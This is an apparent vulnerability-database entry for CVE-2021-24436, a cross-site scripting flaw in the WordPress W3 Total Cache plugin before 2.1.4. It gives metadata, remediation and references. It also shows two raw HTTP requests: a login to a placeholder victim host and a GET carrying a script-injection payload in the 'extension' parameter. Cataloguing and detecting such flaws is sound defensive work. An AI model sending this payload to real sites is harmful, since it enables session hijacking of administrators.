---
layout: post
cve_id: CVE-2021-24436
title: WordPress W3 Total Cache <2.1.4 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24436.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24436.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  inject malicious scripts into the affected website, leading to potential data theft,
  session hijacking, or defacement.

  '
remediation: Fixed in version 2.1.4.
reference:
- https://wpscan.com/vulnerability/3e855e09-056f-45b5-89a9-d644b7d8c9d0
- https://wordpress.org/plugins/w3-total-cache/
- https://wpscan.com/vulnerability/05988ebb-7378-4a3a-9d2d-30f8f58fe9ef
- https://nvd.nist.gov/vuln/detail/CVE-2021-24436
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-24436
  cwe-id: CWE-79
  epss-score: 0.05838
  epss-percentile: 0.90252
  cpe: cpe:2.3:a:boldgrid:w3_total_cache:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: boldgrid
  product: w3_total_cache
  framework: wordpress
tags:
- cve2021
- cve
- xss
- wpscan
- wordpress
- wp-plugin
- wp
- w3-total-cache
- authenticated
- boldgrid
- vuln
---

## ðŸ” Vulnerability Description
WordPress W3 Total Cache plugin before 2.1.4 is susceptible to cross-site scripting within the extension parameter in the Extensions dashboard, which is output in an attribute without being escaped first. This can allow an attacker to convince an authenticated admin into clicking a link to run malicious JavaScript within the user's web browser, which could lead to full site compromise.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
log=czZuuS&pwd=RZK1r0&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=w3tc_extensions&extension="%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.25 (KHTML, like Gecko) Version/3.2 Safari/525.25
Connection: close
Accept-Encoding: gzip
```

